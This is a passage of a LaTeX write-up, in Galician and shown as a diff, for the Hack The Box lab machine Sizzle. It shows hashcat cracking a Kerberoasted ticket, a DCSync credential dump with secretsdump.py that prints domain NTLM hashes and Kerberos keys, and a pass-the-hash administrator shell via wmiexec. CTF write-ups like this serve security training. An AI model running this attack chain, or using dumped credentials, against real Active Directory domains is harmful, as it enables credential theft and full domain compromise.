+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$c8b04860abd4d1d0917dc...2afb:Football#7
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*...ad2afb
+Time.Started.....: Tue Jul 19 16:57:26 2022 (30 secs)
+Time.Estimated...: Tue Jul 19 16:57:56 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   346.6 kH/s (0.62ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 11167232/14344385 (77.85%)
+Rejected.........: 0/11167232 (0.00%)
+Restore.Point....: 11166976/14344385 (77.85%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: Forbidden1 -> Fondy
+Hardware.Mon.#1..: Util: 98%
+
+Started: Tue Jul 19 16:56:55 2022
+Stopped: Tue Jul 19 16:57:58 2022
+
+$ hashcat -m 13100 --show hash-kerberoasting.txt
+$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$c8b04860abd4d1d0917dc...2afb:Football#7\end{lstlisting}
+
+
+Temos novas credenciais: \textbf{mrlky:Football\#7}\par
+
+\clearpage
+        \vspace*{-1.2cm}
+        \section{Escalada de privilexios: DCSync Rights}
+Agora coas novas credenciais, e debido ao permiso \textbf{DCSync} podemos \emph{"dumpear"} os hashes dos usuarios do dominio:
+        \begin{lstlisting}[language=Bash, caption=Dumpear hashes: secretsdump.py, linewidth=17.8cm]
+$ secretsdump.py htb.local/mrlky:Football#7@10.10.10.103
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:131dbd325eebba9bb2c0bc26011f9caf:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
+Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
+Administrator:des-cbc-md5:ad7afb706715e964
+krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
+krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
+krbtgt:des-cbc-md5:866db35eb9ec5173
+amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
+amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
+amanda:des-cbc-md5:70ba677a4c1a2adf
+mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
+mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
+mrlky:des-cbc-md5:02f1a4da0432f7f7
+sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
+sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
+sizzler:des-cbc-md5:5d51d30e68d092d9
+SIZZLE$:aes256-cts-hmac-sha1-96:25c33121d980b4ab4779d4bc4b4981174615567d80e85d4e72272279876391ba
+SIZZLE$:aes128-cts-hmac-sha1-96:e590eafb18dc5b5f812d71de9d88a901
+SIZZLE$:des-cbc-md5:9ddc57a48645e657
+[*] Cleaning up...\end{lstlisting}
+
+Pois agora xa podemos acceder facendo un \textit{PasstheHash (PtH)} con \textit{wmiexec}. 
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=De Interese,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+E ademais como temos o hash do usuario \textbf{Administrator} podemos facer PtH sendo Administradores do sistema
+        \end{tcolorbox}
+
+
+        \vspace*{-0.4cm}
+\subsection{Acceso como administrador}
+                                   
+        \begin{lstlisting}[language=Bash, caption=Acceso como administrador: PtH con wmiexec, linewidth=18.7cm]
+$ wmiexec.py htb.local/Administrator@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+htb\administrator
+\end{lstlisting}
+
+        \vspace*{-0.6cm}
+\subsection{Flag user}
+        \begin{lstlisting}[language=Bash, caption=Flag user.txt]
+C:\>type c:\users\mrlky\desktop\user.txt\end{lstlisting}
+
+        \vspace*{-0.4cm}
+\subsection{Flag root}
+        \begin{lstlisting}[language=Bash, caption=Flag root.txt]
+C:\>type c:\users\administrator\desktop\root.txt\end{lstlisting}
+
+
+\clearpage
+\vspace*{-1.8cm}
+\begin{appendices}
+\addtocontents{toc}{\protect\setcounter{tocdepth}{2}}
+\makeatletter
+\addtocontents{toc}{%
+\begingroup
+%\let\protect\l@chapter\protect\l@section
+\let\protect\l@section\protect\l@subsection
+}
+
+\vspace*{-0.7cm}
+%\chapter{Pentesting AD-DC}
+\section{URLs de Interese}
+\vspace*{-0.2cm}
+        \centering
+        %\includegraphics[width=1.0\textwidth]{\urlsInterese}\par\vspace{1cm}
+        \input{include/URLs-de-Interese-Pentesting-AD-DC.tex}
+        %\input{include/URLs2-de-Interese-Pentesting-AD-DC.tex}
+\addtocontents{toc}{\endgroup}
+\end{appendices}
+
+\end{document}
